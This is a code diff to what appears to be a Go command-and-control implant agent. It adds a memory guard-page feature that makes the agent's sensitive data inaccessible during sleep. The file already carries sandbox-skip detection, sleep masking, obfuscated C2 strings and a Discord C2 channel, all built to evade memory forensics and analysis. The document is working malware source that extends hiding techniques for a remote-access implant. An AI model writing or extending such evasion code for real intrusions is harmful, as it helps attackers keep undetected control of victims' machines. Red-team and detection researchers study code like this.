@@ -71,6 +71,7 @@ var (
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
+	sleepGuardPages   string = ""     // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
 	discordBotToken          string = ""     // Discord bot token for Discord C2 profile
 	discordChannelID         string = ""     // Discord channel ID for Discord C2 profile
 	discordPollDelay         string = ""     // Seconds between Discord message polls (default: 10)
@@ -510,6 +511,7 @@ func runAgent() {
 	// Prevents memory forensics from extracting sensitive config from the data segment.
 	sandboxGuardEnabled := sandboxGuard == "true"
 	sleepMaskEnabled := sleepMask == "true"
+	guardPagesEnabled := sleepGuardPages == "true"
 	clearGlobals()
 
 	// Initialize command handlers
@@ -566,12 +568,12 @@ checkinDone:
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("running %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("stopped")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool) {
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
 
@@ -598,11 +600,18 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
 					log.Printf("schedule pause %v", sleepDuration)
 					var whVault *sleepVault
+					var whGuard *guardedPages
 					if sleepMaskEnabled {
 						whVault = obfuscateSleep(agent, c2)
+						if guardPagesEnabled {
+							whGuard = guardSleepPages(whVault)
+						}
 					}
 					time.Sleep(sleepDuration)
 					if sleepMaskEnabled {
+						if guardPagesEnabled {
+							unguardSleepPages(whGuard, whVault)
+						}
 						deobfuscateSleep(whVault, agent, c2)
 					}
 					continue
@@ -654,11 +663,15 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}(task)
 			}
 
-			// Sleep before next iteration — with optional sleep mask and sandbox detection
+			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
 			var vault *sleepVault
+			var guard *guardedPages
 			if sleepMaskEnabled {
 				vault = obfuscateSleep(agent, c2)
+				if guardPagesEnabled {
+					guard = guardSleepPages(vault)
+				}
 			}
 			sleepSkipped := false
 			if sandboxGuardEnabled {
@@ -669,6 +682,9 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				time.Sleep(sleepTime)
 			}
 			if sleepMaskEnabled {
+				if guardPagesEnabled {
+					unguardSleepPages(guard, vault)
+				}
 				deobfuscateSleep(vault, agent, c2)
 			}
 			if sleepSkipped {
